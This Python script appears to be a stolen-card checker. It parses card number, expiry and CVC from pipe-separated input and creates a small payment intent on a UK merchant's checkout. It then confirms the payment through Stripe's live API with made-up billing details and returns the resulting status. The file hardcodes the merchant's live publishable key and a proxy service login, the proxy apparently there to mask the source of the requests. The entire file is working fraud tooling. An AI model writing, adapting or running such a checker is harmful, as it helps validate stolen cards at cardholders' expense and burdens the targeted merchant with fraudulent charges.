import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_79bd0714-zone-datacenter_proxy1:5aqamf4mqtlv"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'webpro-it.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://webpro-it.co.uk',
	    'referer': 'https://webpro-it.co.uk/checkout/invoice',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'amount': '1',
	    'invoice_number': '1',
	    'is_webinar': '',
	}
	
	response = requests.post('https://webpro-it.co.uk/handle-payment-intent', headers=headers, data=data)
	
	pi = re.search(r'"client_secret":"(.*?)_secret_', response.text).group(1)
	client_secret = response.json()['client_secret']
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=TH&payment_method_data[billing_details][address][line1]=Street+27&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][email]=rodamuser08%40gmail.com&payment_method_data[billing_details][phone]=4303000850&payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[payment_user_agent]=stripe.js%2F4b16495512%3B+stripe-js-v3%2F4b16495512%3B+payment-element&payment_method_data[client_attribution_metadata][client_session_id]=NA&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=standard&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51PGz0w1kvJf1dIf4pdlqcaWDriITzYeEUjvr9CXtDfYklV1MZnHVw6qsv8yKZncbbqodNRHv3T3jzkvFbqdRUf3300ptDG3gzB&client_secret={client_secret}'
	
	response = requests.post(
	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
	    headers=headers,
	    data=data,
	)
	
	result = re.search(r'"status": "(.*?)"', response.text).group(1)
	return (result)
